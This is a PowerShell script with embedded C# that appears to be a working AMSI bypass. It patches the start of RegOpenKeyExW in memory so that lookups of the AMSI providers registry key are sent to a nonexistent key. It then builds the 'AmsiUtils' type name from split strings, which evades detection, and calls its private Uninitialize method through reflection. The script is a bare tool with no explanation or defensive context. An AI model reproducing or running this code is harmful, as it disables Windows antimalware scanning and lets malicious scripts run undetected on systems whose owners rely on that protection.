Add-Type -TypeDefinition @"
using System;
using System.Linq;
using System.Runtime.InteropServices;

public static class TrollDisappearKeyPS
{

    [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

    static public int oldProtect;
    static public IntPtr targetAddr, hookAddr;
    static public byte[] originalBytes = new byte[12];
    static public byte[] hookBytes = new byte[12];
    static public int counter;
    static public delegateRegOpenKeyExW A;


    public static void DisappearKey()
    {
        A = RegOpenKeyWDetour;
        targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
        hookAddr = Marshal.GetFunctionPointerForDelegate(A);
        Marshal.Copy(targetAddr, originalBytes, 0, 12);
        hookBytes = new byte[] { 72, 184 }.Concat(BitConverter.GetBytes((long)(ulong)hookAddr)).Concat(new byte[] { 80, 195 }).ToArray();
        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);

    }

    static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
    {
        try
        {
            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);

            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
            {
                counter = counter + 1; 
                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
            }
            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);

        }
        finally
        {
            if (counter == 0) { Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length); }
            
        }
    }
}
"@

[TrollDisappearKeyPS]::DisappearKey()

$t1 = 'System.Manage'
$t2 = 'ment.Automa' 
$t3 = 'tion.A'
$t4 = 'msi'
$t5 = 'Utils'
$object = [Ref].Assembly.GetType($t1 + $t2 + $t3 + $t4 + $t5)
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)
